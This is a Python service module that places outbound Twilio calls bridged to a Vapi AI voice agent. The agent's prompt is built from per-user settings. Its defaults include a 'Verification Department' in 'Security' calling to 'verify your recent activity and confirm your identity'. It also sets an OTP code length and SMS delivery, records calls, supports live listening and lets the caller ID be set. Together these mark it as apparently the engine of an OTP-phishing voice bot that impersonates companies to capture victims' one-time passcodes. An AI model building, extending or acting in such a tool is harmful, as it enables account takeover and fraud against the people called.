"""
services/twilio_service.py

Twilio service for placing outbound bridge calls.
"""

import json
import logging
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from typing import Optional
from urllib.parse import quote_plus

from twilio.rest import Client

from config import ACCOUNT_SID, AUTH_TOKEN, TWILIO_PHONE_NUMBER, OUTBOUND_CALLER_ID, NGROK_URL, build_public_base_url
from core.files import ensure_user_path, user_conf_path, write_user_file
logger = logging.getLogger(__name__)

_twilio_client = None
_call_executor = ThreadPoolExecutor(
    max_workers=4,
    thread_name_prefix="twilio-call",
)


def get_twilio_client():
    global _twilio_client
    if _twilio_client is None:
        if ACCOUNT_SID and AUTH_TOKEN and "YOUR_" not in str(ACCOUNT_SID):
            _twilio_client = Client(ACCOUNT_SID, AUTH_TOKEN)
        else:
            logger.error("Twilio credentials not properly configured")
    return _twilio_client


def dial_call_with_twiml(
    to: str,
    from_number: str,
    twiml: str,
    user_id: str = "",
    chat_id: Optional[int] = None,
    caller_id: Optional[str] = None,
    record: bool = True,
    status_callback_events: Optional[list] = None,
    **kwargs,
) -> Optional[str]:
    """Place an outbound Twilio call that immediately streams to Vapi via TwiML.

    Twilio does the actual dialing; Vapi only handles STT/LLM/TTS over the
    media stream started by the provided TwiML (``<Connect><Stream>``).
    Returns the Twilio Call SID on success or None.
    """
    client = get_twilio_client()
    if not client:
        logger.error("Twilio not configured")
        return None

    public_base = build_public_base_url() or NGROK_URL
    call_params = {
        "to": to,
        "from_": from_number,
        "twiml": twiml,
        "method": "POST",
    }

    status_cb = f"{public_base.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
    if chat_id:
        status_cb += f"&chat_id={quote_plus(str(chat_id))}"
    call_params["status_callback"] = status_cb
    call_params["status_callback_method"] = "POST"
    call_params["status_callback_event"] = status_callback_events or [
        "queued", "ringing", "answered", "completed", "busy", "failed", "no-answer", "canceled",
    ]

    rec_cb = f"{public_base.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
    if chat_id:
        rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
    call_params["recording_status_callback"] = rec_cb
    call_params["recording_status_callback_method"] = "POST"
    call_params["recording_status_callback_event"] = ["completed"]
    if record:
        call_params["record"] = True
        call_params["recording_channels"] = "mono"

    logger.info("Twilio bridge outbound call params: %s",
                {k: v for k, v in call_params.items() if k != "twiml"})
    try:
        call = client.calls.create(**call_params)
        logger.info("[TWILIO_BRIDGE_CALL_CREATED] sid=%s to=%s", call.sid, to)
        return call.sid
    except Exception as e:
        logger.error("[TWILIO_BRIDGE_CALL_ERROR] %s", e)
        return None


def end_call(twilio_sid: str) -> bool:
    """Hang up an active Twilio call (used to end a bridged AI call)."""
    client = get_twilio_client()
    if not client or not twilio_sid:
        return False
    try:
        client.calls(twilio_sid).update(status="completed")
        logger.info("[TWILIO_END_CALL] sid=%s", twilio_sid)
        return True
    except Exception as e:
        logger.warning("[TWILIO_END_CALL_ERROR] sid=%s error=%s", twilio_sid, e)
        return False


def place_ai_call(
    to: str,
    user_id: str,
    chat_id: Optional[int],
    customer_name: str,
    assistant_overrides: dict,
    metadata: dict,
    from_number: str = None,
    caller_id: str = None,
    record: bool = True,
    endpoint: str = "/twilio_bridge",
    mode_label: str = "AI Call",
    **session_kwargs,
) -> Optional[str]:
    """Create a Vapi bypass session and place the call via Twilio.

    Returns the Twilio SID, or None. Registers the session keyed by the Twilio
    SID and keeps the Vapi call id in the session for OTP/transcript handling.
    """
    from services.vapi_service import create_call_bypass

    bridge = create_call_bypass(
        customer_number=to,
        customer_name=customer_name,
        assistant_overrides=assistant_overrides,
        metadata=metadata,
    )
    if not bridge:
        logger.error("[VAPI_BRIDGE] bypass call failed for %s (user=%s)", to, user_id)
        return None

    vapi_call_id = bridge["vapi_call_id"]
    twiml = bridge["twiml"]
    twilio_sid = dial_call_with_twiml(
        to=to,
        from_number=from_number or OUTBOUND_CALLER_ID,
        twiml=twiml,
        user_id=user_id,
        chat_id=chat_id,
        caller_id=caller_id,
        record=record,
    )
    if not twilio_sid:
        logger.error("[VAPI_BRIDGE] Twilio dial failed for %s (vapi_call=%s)", to, vapi_call_id)
        return None

    logger.info("[VAPI_BRIDGE] Call placed by Twilio sid=%s vapi_call=%s target=%s (user=%s)",
                twilio_sid, vapi_call_id, to, user_id)
    store_call_metadata(user_id, twilio_sid, target=to)
    try:
        from bot import register_call_session
        register_call_session(
            twilio_sid,
            user_id,
            chat_id=chat_id,
            endpoint=endpoint,
            mode_label=mode_label,
            vapi_call_id=vapi_call_id,
            **session_kwargs,
        )
    except Exception as exc:
        logger.debug("Failed to register bridge session: %s", exc)
    try:
        from bot import _notify_live_listen_start
        _notify_live_listen_start(twilio_sid, chat_id=chat_id, user_id=user_id)
    except Exception as exc:
        logger.debug("Failed to bootstrap live listen session: %s", exc)
    return twilio_sid


def make_call(to: str, from_number: str = None, caller_id: str = None,
              webhook_url: str = None, user_id: str = "",
              record: bool = True,
              **kwargs) -> Optional[str]:
    from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
    from services.prompt_builder import PromptBuilder
    from services.voice_identity import select_agent_name
    from core.files import read_user_file, user_conf_path

    name = kwargs.get("name") or read_user_file(user_id, "Name.txt", "Customer")
    company = kwargs.get("company") or read_user_file(user_id, "Company Name.txt", "Verification Department")
    department = kwargs.get("department") or read_user_file(user_id, "Department.txt", "Security")
    reason = kwargs.get("reason") or read_user_file(user_id, "Reason.txt", "verify your recent activity and confirm your identity")
    chat_id = kwargs.get("chat_id")
    code_length_str = kwargs.get("code_length") or read_user_file(user_id, "CodeLength.txt", "6")
    code_length = int(code_length_str)
    delivery_method = kwargs.get("delivery_method") or read_user_file(user_id, "Delivery.txt", "sms")
    voice_provider = kwargs.get("voice_provider") or read_user_file(user_id, "VoiceProvider.txt", "vapi")
    voice_id = kwargs.get("voice_id") or read_user_file(user_id, "Voice.txt", "")
    emotion = kwargs.get("emotion") or read_user_file(user_id, "emotion.txt", "neutral")
    language = kwargs.get("language") or read_user_file(user_id, "Language.txt", "en")
    speaking_style = kwargs.get("speaking_style") or read_user_file(user_id, "SpeakingStyle.txt", "") or None
    speech_speed = float(kwargs.get("speech_speed") or read_user_file(user_id, "SpeechSpeed.txt", "1.0"))

    customer_name = name
    agent_name = select_agent_name(voice_id)

    metadata = CallMetadata(
        target=TargetInfo(name=name, phone=to, customer_type="customer"),
        company=CompanyInfo(name=company, department=department, representative_name=agent_name),
        reason=reason,
        otp=OTPConfig(length=code_length, delivery_method=delivery_method),
        ai=AIBehavior(
            voice_provider=voice_provider,
            voice_id=voice_id,
            language=language,
            emotion=emotion,
            speaking_style=speaking_style,
            speech_speed=speech_speed,
        ),
    )
    custom_instructions = kwargs.get("custom_instructions") or read_user_file(user_id, "custom_script.txt", "") or None
    if custom_instructions:
        metadata.custom_instructions = custom_instructions
    else:
        override = read_user_file(user_id, "ai_prompt_override.txt", "").strip()
        if override:
            metadata.custom_instructions = override
    metadata.internal = {
        "user_id": user_id,
        "chat_id": chat_id,
        "code_length": code_length,
    }

    builder = PromptBuilder()
    system_prompt = builder.build(metadata)
    assistant_overrides = metadata.to_vapi_assistant_overrides()
    assistant_overrides["model"]["messages"] = [
        {"role": "system", "content": system_prompt},
    ]

    call_metadata = {
        "user_id": user_id,
        "chat_id": str(chat_id) if chat_id else "",
        "code_length": str(code_length),
    }

    return place_ai_call(
        to=to,
        user_id=user_id,
        chat_id=chat_id,
        customer_name=customer_name,
        assistant_overrides=assistant_overrides,
        metadata=call_metadata,
        from_number=from_number,
        caller_id=caller_id,
        record=record,
        endpoint=kwargs.get("endpoint") or "/twilio_bridge",
        mode_label=kwargs.get("mode_label") or "AI Call",
        voice_id=voice_id,
        emotion=emotion,
        name=name,
        company=company,
        language=language,
        code_length=str(code_length),
        delivery_method=delivery_method,
    )


def make_call_and_store_async(
    user_id: str,
    to: str,
    from_number: str = None,
    caller_id: str = None,
    webhook_url: str = None,
    record: bool = True,
    target: str = "",
    **kwargs,
):
    """Launch a Twilio call and persist metadata in the background."""

    def _run() -> Optional[str]:
        sid = make_call(
            to=to,
            from_number=from_number,
            caller_id=caller_id,
            webhook_url=webhook_url,
            user_id=user_id,
            record=record,
            **kwargs,
        )
        return sid

    try:
        return _call_executor.submit(_run)
    except Exception as exc:
        logger.error("Twilio call + metadata dispatch failed: %s", exc, exc_info=True)
        return None


def get_call_status(call_id: str) -> Optional[str]:
    client = get_twilio_client()
    if not client or not call_id:
        return None
    try:
        if str(call_id).startswith("CA"):
            return client.calls(call_id).fetch().status
    except Exception as e:
        logger.warning("[TWILIO_GET_CALL_STATUS_ERROR] id=%s error=%s", call_id, e)
    from services.vapi_service import get_call as vapi_get_call
    call_data = vapi_get_call(call_id)
    if call_data:
        return call_data.get("status")
    return None


def store_call_metadata(user_id: str, sid: str, target: str = "") -> None:
    """Store call SID in user's metadata (for live listen)."""
    ensure_user_path(user_id)
    write_user_file(user_id, "call_sid.txt", sid)
    history_path = user_conf_path(user_id) / "call_history.json"
    history = []
    if history_path.exists():
        try:
            with open(history_path, "r", encoding='utf-8') as f:
                history = json.load(f)
        except Exception:
            history = []
    history.append({
        "sid": sid,
        "target": target,
        "started": datetime.now().isoformat(),
        "status": "initiated"
    })
    with open(history_path, "w", encoding='utf-8') as f:
        json.dump(history, f, indent=2)
